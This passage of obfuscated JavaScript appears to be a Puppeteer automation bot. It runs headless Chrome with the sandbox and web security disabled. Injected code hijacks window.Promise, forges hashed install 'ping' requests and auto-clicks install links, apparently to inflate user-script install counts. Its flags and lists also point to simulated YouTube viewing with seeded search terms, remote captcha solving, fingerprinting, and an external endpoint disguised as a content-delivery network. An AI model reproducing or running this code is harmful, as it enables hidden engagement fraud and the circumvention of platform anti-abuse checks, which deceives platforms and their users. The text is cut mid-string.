              if (!this['finalized']) {
                this['finalized'] = 0x90b + 0xa8d * 0x2 + -0x789 * 0x4;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[-0x1b42 + -0x1508 + 0x305a] = this['block'], J[K >> 0x7 * 0x368 + -0xaf8 + -0x2 * 0x66f] |= x[0x1fc1 + 0x20c7 + -0x4085 & K], this['block'] = J[0x9 * 0x2ef + 0x1eb * -0x5 + -0x10c0], K >= -0x1 * -0x855 + 0xa * -0x2b6 + 0x12ff && (this['hashed'] || this['hash'](), J[0x1 * -0x9b5 + 0x11c3 * 0x1 + 0x1 * -0x80e] = this['block'], J[0x1373 + -0x38f * 0x6 + 0x1f7 * 0x1] = J[-0x8 * 0x1fa + -0x1 * -0x19bc + 0x9eb * -0x1] = J[0x1443 + -0x3 * -0x858 + -0x2d49 * 0x1] = J[0x68 * 0x57 + -0x31 * 0xc5 + 0x260] = J[-0x24a0 + 0xb50 + 0x1954] = J[0x15b * 0x1 + -0x2428 + -0x2 * -0x1169] = J[-0x1562 + 0xf22 + -0x646 * -0x1] = J[-0x2115 * 0x1 + 0x104b + -0x267 * -0x7] = J[0x145 * -0x4 + -0x4 * -0x464 + 0x2 * -0x63a] = J[0x1 * 0x1e54 + 0x112 * 0x16 + 0x7b1 * -0x7] = J[0x2 * 0x1251 + 0xa * 0x50 + -0x13dc * 0x2] = J[-0xa9 * -0x1d + 0xf1c + 0x1d * -0x12e] = J[-0xece + -0xb62 * 0x3 + -0x4 * -0xc40] = J[0xfb * -0x14 + -0x2486 + 0x382f] = J[-0x48 * -0x54 + -0x9f6 + -0x43 * 0x34] = J[-0x101 * 0x23 + 0x1263 * 0x1 + 0x10cf] = 0x14d7 + 0xd * 0xc5 + -0x1ed8), J[-0xb55 + 0x1c2b + 0x864 * -0x2] = this['hBytes'] << -0x1f38 + 0x1ca9 + -0x5e * -0x7 | this['bytes'] >>> -0xf72 + -0x319 * -0xc + -0x159d, J[-0x25 * 0x37 + -0x2659 * -0x1 + 0x35f * -0x9] = this['bytes'] << -0xa9 * -0xb + -0x1fb8 + 0x1878, this['hash']();
              }
            }
            ['hash']() {
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x1175 + 0xb5b + -0x20e * -0x3; J < 0x2390 + -0xef8 * -0x2 + -0x4130; ++J)
                K = Q[J - (-0x583 + -0x1 * -0x11a7 + -0xc21)] ^ Q[J - (-0x3f * -0x22 + 0x15f5 + -0x1e4b)] ^ Q[J - (-0x1 * 0x1ea6 + -0x6f1 * -0x1 + 0x4d * 0x4f)] ^ Q[J - (-0x1ae4 * 0x1 + 0xf64 * -0x1 + 0x2a58)], Q[J] = K << -0xc86 * 0x3 + 0xfc6 + 0x15cd | K >>> -0x5 * -0x4fb + 0x283 * 0x7 + 0x2d3 * -0xf;
              for (J = -0x6 * 0x607 + -0x1 * 0x22b3 + 0x46dd; J < 0xee8 + 0x482 * -0x1 + -0xa52; J += 0xba8 * 0x2 + 0xce5 * 0x1 + 0x4 * -0x90c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0xe2 * -0x2 + 0x3b * 0x7d + -0x1 * 0x1e8e | L >>> 0x16ad + 0x1f20 + 0x1d * -0x1da) + (M & N | ~M & O) + P + (-0x1 * -0x273fc9d1 + -0x395efb * 0x172 + 0x862df68e) + Q[J] << 0x122 + 0x11db * 0x1 + -0x12fd) << 0xa37 + 0x85 * -0x4b + 0x3 * 0x997 | P >>> 0xc1 + -0x1d32 + -0x261 * -0xc) + (L & (M = M << 0x1 * 0x78 + 0xb * -0x1 + -0x4f | M >>> -0x2254 * 0x1 + 0x1ba + -0x209c * -0x1) | ~L & N) + O + (0x6ffa02a * -0x1 + 0x131a0735 + -0x3 * -0x1a22b0da) + Q[J + (0x1692 + -0x1 * -0x26d2 + 0x8c5 * -0x7)] << -0x1 * -0x21ae + -0x96 + -0xc * 0x2c2) << 0x2 * 0x7c2 + 0x2 * 0xaa9 + -0x24d1 | O >>> -0x14dd * -0x1 + 0x2 * -0xe3b + 0x7b4) + (P & (L = L << -0x1364 + -0xaef + 0x1 * 0x1e71 | L >>> 0xd16 + 0x26ef * -0x1 + 0x19db) | ~P & M) + N + (-0x45ff4667 + 0x19be1c57 + -0x3a46c35 * -0x25) + Q[J + (-0x1366 * -0x1 + -0x21d7 * 0x1 + 0x9 * 0x19b)] << -0x171c + 0x4 * -0x871 + 0x1c * 0x208) << -0x98d + -0x852 + 0x394 * 0x5 | N >>> 0x54 * -0x45 + 0x2171 * -0x1 + 0x3830) + (O & (P = P << -0x78d + 0xc7c * 0x1 + 0x89 * -0x9 | P >>> -0x2621 + -0x12c3 + -0x38e6 * -0x1) | ~O & L) + M + (-0xfeb82d6 + 0x3dc24202 + 0x2cabba6d) + Q[J + (-0x80c + 0xd66 + -0x557)] << 0x1e14 + -0x1e * 0xb1 + -0x956) << 0x1 * -0x1ddf + 0x1025 * 0x1 + -0x3 * -0x495 | M >>> -0x7 * 0x304 + -0x821 * -0x2 + 0x4f5) + (N & (O = O << 0xb2 * -0x13 + 0x4 * -0x3d1 + 0x1c98 | O >>> -0x25d1 + -0x4 * -0xdb + 0x1 * 0x2267) | ~N & P) + L + (0x8e20032f + -0xa74d992a + -0x1cec03e5 * -0x4) + Q[J + (0x7f * -0x26 + -0x209b + 0x3379)] << -0x117b * -0x2 + 0x16ac * 0x1 + -0x39a2, N = N << 0x2308 + 0x2a2 * 0x5 + -0x11 * 0x2d4 | N >>> -0x1 * 0x2f9 + 0x24a9 + 0x2 * -0x10d7;
              for (; J < -0x617 * 0x1 + -0x257d + 0x2bbc; J += 0x6f8 + -0x183c + 0x1149)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x259 + -0x18cf + 0x167b | L >>> 0xb * -0x2f3 + 0x14cd + 0x1 * 0xbbf) + (M ^ N ^ O) + P + (0x24c534a + 0x1 * -0x28d9ae42 + 0x73 * 0x14c95c3) + Q[J] << -0xb * 0x2e3 + 0x35 * -0x22 + 0x26cb) << 0x5 * 0x4e1 + 0x67e + -0x1ede | P >>> 0x127 + -0x3 * 0x93f + 0x1 * 0x1ab1) + (L ^ (M = M << -0x2341 + 0xf58 + 0x3 * 0x6ad | M >>> -0x283 * 0x5 + 0x1ca5 + -0x1014) ^ N) + O + (-0xd461dea6 + -0xea29f7f * -0x1 + 0x134992ac8) + Q[J + (0x73 * 0x43 + -0x5 * -0x76b + -0x15f * 0x31)] << 0x24b * -0xb + -0x1ec4 + -0xb * -0x517) << 0xd * -0x281 + 0xa7 * 0xd + 0x1817 | O >>> -0x6 * -0x355 + 0xa85 * 0x1 + 0x22c * -0xe) + (P ^ (L = L << -0x9f1 + 0x20e2 + -0x1 * 0x16d3 | L >>> 0x1321 + 0x146e + 0x195 * -0x19) ^ M) + N + (-0x3a363d54 + 0xa97d1a47 + 0x6cf152 * -0x1) + Q[J + (0x1b6 * -0x12 + -0x1af * -0x5 + 0x209 * 0xb)] << -0x7fb + 0x250c + -0x1d11 * 0x1) << 0x1 * 0x22e + 0x1ae1 + -0x1d0a | N >>> 0xf61 + 0x2 * -0xaab + 0x610) + (O ^ (P = P << 0x807 + 0x7a6 + -0xf8f | P >>> -0x1 * -0xe7b + 0x1969 + -0x2 * 0x13f1) ^ L) + M + (0xc7f * 0x1135de + -0x2b90073 * -0x8 + -0x7dfe3919) + Q[J + (0x17dc + 0x537 * -0x5 + 0x23a)] << 0x1cb0 + -0x1a1 + -0x1b0f) << 0x63c + 0x1f0f + -0x2546 | M >>> -0x1348 + 0x1a62 + -0x3 * 0x255) + (N ^ (O = O << 0x728 + 0x2330 + -0xa * 0x439 | O >>> -0x1 * -0x153 + -0x169 * 0x1a + 0x1 * 0x2359) ^ P) + L + (0x3069179 + 0x81a1b8b7 * -0x1 + 0xed7512df) + Q[J + (-0x1c3d + 0x1d0e + -0xcd)] << -0xcfc + -0x833 + 0xb * 0x1ed, N = N << -0x2 * -0x1196 + -0x13e6 + -0xf28 | N >>> 0x1029 + 0x1ef7 + -0x2f1e;
              for (; J < 0x5 * -0x407 + 0x7 * -0x139 + 0x1cee; J += -0x3 * 0x7a5 + 0x1 * 0x1dbd + 0x1 * -0x6c9)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0xb * -0x242 + 0x4f5 + 0x12 * 0x11b | L >>> -0x1 * 0x7a9 + 0x525 * -0x1 + 0xce9) + (M & N | M & O | N & O) + P - (-0x9dde6144 + -0xf1 * -0x65f1d + 0x108c31a1b) + Q[J] << 0x164b * 0x1 + -0xf3b + -0x710) << 0x17 * -0x6e + -0x16c9 + 0x1058 * 0x2 | P >>> -0x3a * 0x3 + -0x4 * 0x3b9 + 0xfad * 0x1) + (L & (M = M << -0x281 * 0x1 + 0x1d45 + 0xd53 * -0x2 | M >>> 0x259f * 0x1 + -0x11d6 + -0x13c7) | L & N | M & N) + O - (0x3fb72bb + -0x97c0a0e4 * 0x1 + 0x7 * 0x253cc70b) + Q[J + (0x1 * 0x21b4 + 0xc1f + -0x2dd2)] << 0x1a35 + 0x95 * 0xd + 0x21 * -0x106) << -0x1 * 0xaab + 0x1 * -0x1c41 + 0x26f1 | O >>> 0x1 * -0x1ea2 + 0x1737 + -0x12 * -0x6b) + (P & (L = L << 0x1f23 + 0x100f + -0x2f14 | L >>> 0x1c3f + -0x1 * 0x709 + -0x2 * 0xa9a) | P & M | L & M) + N - (-0x223 * 0x71d4d + 0x1975c7 * -0x289 + 0xc0a3742a) + Q[J + (-0x10cb + -0xb1a + 0x1be7)] << 0x13f5 + 0xeb7 + 0x27a * -0xe) << -0x21d4 + 0x26ee + 0x1 * -0x515 | N >>> -0x5 * 0x9e + 0x29 * 0x9 + 0xe * 0x20) + (O & (P = P << -0x581 * -0x1 + 0x218 * 0x1 + -0x17f * 0x5 | P >>> -0x67f * -0x1 + -0xb41 * -0x1 + 0x2f5 * -0x6) | O & L | P & L) + M - (-0x2d832b86 + 0xae734fce + -0x100be124) + Q[J + (0x16bb + 0x5 * 0x655 + 0x3661 * -0x1)] << 0x16 * 0x6b + -0x1a2a + 0x10f8 * 0x1) << 0x13b * 0x11 + 0x17 * -0xb2 + -0x2 * 0x274 | M >>> -0x41 * -0x85 + -0x1acf + -0x2d * 0x27) + (N & (O = O << -0x4d * 0x4f + 0xc7f * 0x1 + 0x2f * 0x3e | O >>> 0x155d + -0x4d * -0x10 + -0x15 * 0x13f) | N & P | O & P) + L - (-0x20075123 + -0x389ee1d7 + 0xc98a761e) + Q[J + (0x33 * -0x58 + -0x1a38 + -0x4 * -0xaf1)] << 0x17b2 + 0x1 * 0x1a13 + -0x31c5, N = N << 0x17e7 + 0x1277 * -0x1 + -0x552 | N >>> -0x145e + 0x1a1c + -0x2de * 0x2;
              for (; J < 0x21e5 * 0x1 + 0x1 * -0xfe8 + 0xb5 * -0x19; J += -0x2 * -0x8df + -0x2 * -0x1064 + -0x3281 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x13c7 + 0x217b + -0xdaf | L >>> -0x9ef + -0x2129 * -0x1 + -0x171f) + (M ^ N ^ O) + P - (-0x444e264f + -0xafd8c8 * 0x7 + 0x5cd77 * 0x15d7) + Q[J] << 0x7b3 + 0x1b64 + -0x2317) << 0x78d * -0x2 + 0x15a7 + -0x688 | P >>> 0x2 * -0x721 + -0x15 * 0x65 + 0x16a6) + (L ^ (M = M << 0x1c66 + -0x198c + -0x46 * 0xa | M >>> 0x24 * -0x5d + 0x359 + 0x9bd) ^ N) + O - (0x4f6ba341 + -0x516f969c + 0x37a13185) + Q[J + (0x2434 + 0x1 * 0x255b + 0x23 * -0x21a)] << 0x1d2c + -0x11cb * -0x2 + -0x40c2) << 0x154e + -0x10f1 * -0x2 + -0x1d * 0x1e7 | O >>> 0x248d + -0x2564 + 0xf2) + (P ^ (L = L << 0x3 * -0x1cc + 0x1c98 + -0x1716 | L >>> -0x2e7 * -0x1 + 0x11da + -0x14bf) ^ M) + N - (-0x2a5ee142 + -0x1 * -0x674d9f96 + -0x751802a) + Q[J + (0x11 * 0x1eb + 0x1 * -0x1675 + 0x2 * -0x512)] << -0x141e + 0x1095 + 0x389) << 0x978 + 0x579 * 0x3 + -0x16 * 0x12d | N >>> -0x1 * -0x952 + -0x1f87 + 0x1650) + (O ^ (P = P << 0x9df + -0x7b9 * 0x1 + -0x208 | P >>> -0x914 + 0x1 * -0x113f + 0x1a55) ^ L) + M - (0x1da4e6a + -0x1 * -0x15fdc282 + 0x1dc52d3e) + Q[J + (-0x3ca + -0x1f * -0xcb + -0x14c8)] << 0x6b1 + -0x11e7 + 0xb36) << 0xf4c + 0x1f21 + -0x108 * 0x2d | M >>> 0x110b + -0x29 * 0x75 + 0x1cd) + (N ^ (O = O << 0x79 * -0x46 + -0xa74 + 0x2ba8 | O >>> 0x680 + -0x11d9 + 0xb5b) ^ P) + L - (0x20d58d21 * 0x3 + -0x6 * 0x581718b + -0xbdabff7) + Q[J + (-0x95 * -0x33 + -0x1e95 + 0xea)] << -0x79 * -0x2 + -0x2387 + 0x2295, N = N << -0x54e + -0x1a68 + 0x1fd4 | N >>> -0xd44 + 0x1f2 + 0xb54 * 0x1;
              this['h0'] = this['h0'] + L << -0x2509 * 0x1 + -0x1 * 0xfb5 + -0x1a5f * -0x2, this['h1'] = this['h1'] + M << -0x1 * -0xead + -0xa8e + -0x41f, this['h2'] = this['h2'] + N << -0x19b1 * 0x1 + -0x1fe + -0x13 * -0x175, this['h3'] = this['h3'] + O << 0xcea + -0x2144 + -0x145a * -0x1, this['h4'] = this['h4'] + P << -0x2d7 * 0x9 + -0x1a39 + 0x33c8;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> 0x1366 + -0x1cd3 + 0x989 * 0x1 & -0x2 * 0x133 + -0x3a * -0x1f + 0xa7 * -0x7] + w[J >> -0xe64 + 0xd3b * 0x1 + -0x6b * -0x3 & 0x904 + 0x1ab8 + 0x1 * -0x23ad] + w[J >> -0x3 * -0x929 + -0xd4e + 0x191 * -0x9 & -0x71f + 0x1939 + 0x120b * -0x1] + w[J >> 0x6b7 + -0x142b + 0x4 * 0x361 & 0x1d * 0xd9 + 0x4 * -0x68 + -0x16e6] + w[J >> 0x1 * -0x1bab + 0x522 + -0x1695 * -0x1 & 0x1620 + -0x202 + -0x140f] + w[J >> 0x1e4 * -0xe + 0x260 * 0xd + -0x460 & -0x1bd7 + -0x1435 + 0x301b * 0x1] + w[J >> -0x12ed + 0x182d * 0x1 + -0x53c & 0x1af5 + 0xc24 + -0x270a] + w[0x1d9a * -0x1 + -0xce6 + 0x2a8f & J] + w[K >> -0xb6e + -0x17ae + 0x119c * 0x2 & 0x11f7 + 0x26ef * -0x1 + -0x301 * -0x7] + w[K >> 0x3 * 0x2bf + 0x70e * 0x5 + -0x2b6b * 0x1 & -0x1 * 0x212b + 0x819 + 0x1921] + w[K >> -0x1f * -0x6f + 0x1492 + -0x21ef & -0x9 * 0x2d + 0xa61 * -0x2 + 0x1 * 0x1666] + w[K >> 0x24f9 + -0x264c + 0x163 & 0x665 * -0x6 + -0x4 * 0x63e + 0x3f65] + w[K >> 0x1a8 + -0x1576 + 0x13da & -0x270b * -0x1 + 0x1728 + 0x61 * -0xa4] + w[K >> 0x7a8 + -0x1294 + 0xaf4 & 0x22e7 + -0x535 * 0x3 + -0x1339] + w[K >> 0xe67 + -0x5a0 + -0x8c3 * 0x1 & 0x7 * 0x3b1 + -0x52 * -0x62 + -0x4 * 0xe4b] + w[-0x181c + -0x1a4c + 0x3277 & K] + w[L >> 0x31 * 0x65 + 0x1 * -0xae + -0x128b & -0x9 * -0x36d + -0x19 * 0x5f + 0x157f * -0x1] + w[L >> -0x1 * -0x10c9 + 0x3c3 * 0x3 + -0x1bfa & 0x194b + -0xac2 + 0x6d * -0x22] + w[L >> 0x149f + -0x1 * 0x2023 + -0x5cc * -0x2 & -0x1706 + 0x86c + -0x1 * -0xea9] + w[L >> 0x99b + -0x147c + 0xaf1 * 0x1 & 0x4 * 0x88a + 0x1a1e * -0x1 + -0x7fb] + w[L >> 0x1 * 0x75e + 0x1 * -0x7f8 + 0xa6 & -0x16c1 + -0x1 * -0x1432 + 0x29e * 0x1] + w[L >> 0x2137 * 0x1 + -0x2a * 0xaf + 0x479 * -0x1 & 0x78a + 0x3c + -0x7b7] + w[L >> -0x1003 + -0xac1 * -0x2 + -0x57b * 0x1 & 0x18ac + -0xc8f + 0x2 * -0x607] + w[0x1 * 0x2cf + 0x1dae + -0x206e & L] + w[M >> -0x2 * -0xe33 + -0x51 * 0x26 + -0x411 * 0x4 & -0x3c2 + -0xdc0 + 0x1191] + w[M >> 0x1 * -0x235f + -0x22f0 + 0x43 * 0x10d & -0x10ba + 0x14a9 + -0x3e0] + w[M >> -0xc9 * -0x1f + -0x19a7 + 0x164 & 0x201d * 0x1 + -0xec4 + -0x114a] + w[M >> -0x1c5d + -0x24b7 + -0x5ec * -0xb & -0xa * -0x99 + -0x1b73 * 0x1 + 0x1588] + w[M >> 0xf0 * -0x9 + -0x2495 + 0x8b * 0x53 & -0x2056 + -0xcd * 0xd + -0x2ace * -0x1] + w[M >> 0x822 + -0x1ddb * -0x1 + -0x25f5 & -0x1c4a + -0x13 * 0xaa + 0x28f7] + w[M >> -0x4 * 0x6d5 + -0x48f + 0x1fe7 * 0x1 & -0x43b * 0x8 + -0x144b + 0x3632] + w[-0x4b * 0x7c + 0xeb1 + -0x1 * -0x15b2 & M] + w[N >> 0x26bd + -0x57c + -0x2125 & 0x1 * -0x925 + 0x1378 + -0x49 * 0x24] + w[N >> -0x1 * 0xb0b + -0x1 * 0xe7b + 0x88a * 0x3 & -0x71f * -0x3 + -0x649 + -0xf05] + w[N >> 0x16c0 + 0xf * 0x4b + -0x215 * 0xd & -0x2513 + -0x2349 + 0x486b] + w[N >> -0x25 * -0x8b + -0x3a * 0x2 + -0x1393 & -0x1 * -0xbe6 + -0x25ce + 0x11 * 0x187] + w[N >> 0x1c53 + -0x107b + 0xbcc * -0x1 & 0x546 + 0xdf3 + -0x132a] + w[N >> -0x3 * 0xc35 + -0x20 * 0xe7 + 0x4187 & 0x1 * 0xaf3 + -0x182b + 0xd47] + w[N >> 0xc1a + -0x192b + 0xd15 & -0x250 + -0xac * -0x39 + -0x23ed * 0x1] + w[-0x60d * -0x3 + 0xdf8 + 0x201 * -0x10 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x1384 * -0x2 + 0x1e26 + 0x4a * -0xef & 0x2577 + -0x7b4 + 0x1c * -0x107,
                J >> -0x1e6 + 0x1bab + -0x19b5 * 0x1 & 0x53a * 0x3 + 0x11c9 * 0x2 + -0x3241,
                J >> 0x15a5 + 0x1f0c + -0x34a9 & -0x25d * 0x5 + -0x2 * -0x126f + -0x180e,
                0x7 * 0x2f7 + -0x26c4 + 0x1302 * 0x1 & J,
                K >> 0x1102 + -0x3b * 0x61 + 0x571 & -0x12 * 0x16e + -0x5 * -0x48d + 0x1fd * 0x2,
                K >> 0xc6d + -0x1 * -0x7ed + -0x144a & -0x1 * -0x42a + 0x58b * -0x3 + 0xd76,
                K >> -0x123 * 0x1f + -0x10f + 0x2454 & 0xca5 + -0x589 + -0x1 * 0x61d,
                0x6ca * -0x2 + -0x157a + -0x1 * -0x240d & K,
                L >> -0x4bb + 0x1 * 0x1ec1 + -0x19ee & -0x10c7 + -0x13 * 0x164 + -0x1619 * -0x2,
                L >> -0x1475 + 0x170c + -0x287 & -0x1 * -0x1c4e + -0x2 * 0x22e + -0x5 * 0x497,
                L >> 0x1a77 + 0x1703 + -0x3172 & 0x274 + 0x246d + -0x1a * 0x175,
                -0x10a5 + -0x7b3 * -0x3 + -0x575 & L,
                M >> -0x97 * 0x35 + -0xc4e + 0x2ba9 & 0x183d + 0x2 * -0xabf + 0x7 * -0x40,
                M >> 0x1e25 + -0xfec + -0xe29 & 0xa9b + 0xc80 + -0x161c,
                M >> 0x1 * 0x2627 + -0x1712 + -0xf0d & -0x926 + -0x1441 + 0x1e66,
                0x173 + 0xc7f * -0x1 + 0xc0b & M,
                N >> -0x26e0 + 0x2e * 0x2 + -0x2 * -0x134e & 0x18cf + 0x1414 + -0x2be4,
                N >> -0x112b + -0x262d + 0x3768 & -0xb7a + 0x1 * -0x362 + 0xfdb,
                N >> 0x1 * -0x21e7 + 0x590 + 0x1c5f & -0x22b1 + -0x20dc + 0x448c,
                -0x73f + -0x1310 + 0xa * 0x2bb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x254b * -0x1 + 0x184a * -0x1 + 0x59b * 0xb), (K = new DataView(J))['setUint32'](0x2 * 0x120d + 0x9e9 * -0x1 + -0x1a31, this['h0']), K['setUint32'](-0xeef * -0x1 + -0x3 * 0x4f1 + -0x18, this['h1']), K['setUint32'](-0x163b + 0x1 * 0x1a4b + -0x408, this['h2']), K['setUint32'](-0x9ec * -0x2 + 0xd * -0x21e + 0x7ba, this['h3']), K['setUint32'](0x3 * -0x8ca + 0x1bd * 0x12 + -0x4dc, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x78b * -0x4 + 0x1 * 0x135a + -0x5 * -0x22a];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x227f + 0xa17 * -0x1 + -0x2 * 0xc34;
            J[-0x1dbd + 0x732 + 0x168b]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x956 + 0x2186 + -0x2adc] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), -0x182c * 0x1 + -0x1fb2 + 0x37df * 0x1), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = 0x2203 * -0x1 + 0x25 * -0x10b + 0x489b * 0x1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x983 * -0x1 + -0x3 * 0x5d + 0x1076), Promise['resolve'](0x18ad + -0xbeb + -0x28d * 0x5);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = 0xdfc + 0x2 * -0x1369 + 0x18d6; j < 0x249a + -0x2256 + -0x243; j++)
    i();
}
const NETWORK_PATIENCE = -0x1aa9 + -0x13e2 + 0x4dcb + (0x9ca + 0x4cf * -0x5 + -0x3d * -0x6d) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x15 * 0xe5 + 0x4 * 0x35 + 0x11f8) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0xb1b * 0x2 + -0xe5d * -0x2 + -0x32f0);
    let h = e[f];
    if (c['PIAqyM'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x4be + 0xe * -0x272 + 0x1d7e, r, s, t = -0x1fd8 + 0x24ad * 0x1 + -0x4d5; s = m['charAt'](t++); ~s && (r = q % (-0x1cb6 + 0x2592 + 0x8d8 * -0x1) ? r * (0xfd * 0xa + 0x1a14 + -0x23b6) + s : s, q++ % (0x18d1 + 0x26af + -0x3f7c)) ? o += String['fromCharCode'](-0x1b6a + -0x1493 + 0x30fc & r >> (-(-0x1c5e + -0x7 * -0x38b + 0x1 * 0x393) * q & 0x16b9 + -0x1b01 + 0x44e)) : -0x95f + 0x27f * 0x7 + 0x7a * -0x11) {
          s = n['indexOf'](s);
        }
        for (let u = -0x2 * 0xd22 + 0x1bfb + 0x1 * -0x1b7, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x9 * 0x1c9 + -0xff * 0x10 + -0x11))['slice'](-(-0xa6d + 0x558 * 0x2 + -0x41));
        }
        return decodeURIComponent(p);
      };
      c['kjHbmw'] = i, b = arguments, c['PIAqyM'] = !![];
    }
    const j = e[-0xd9 + 0x7d5 * 0x1 + 0x95 * -0xc],
      k = f + j,
      l = b[k];
    return !l ? (h = c['kjHbmw'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = 0x1 * -0xb2a + 0x1969 + 0x7 * -0x209; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    const S = b;
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j[S(0x14, 'oJju')](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + 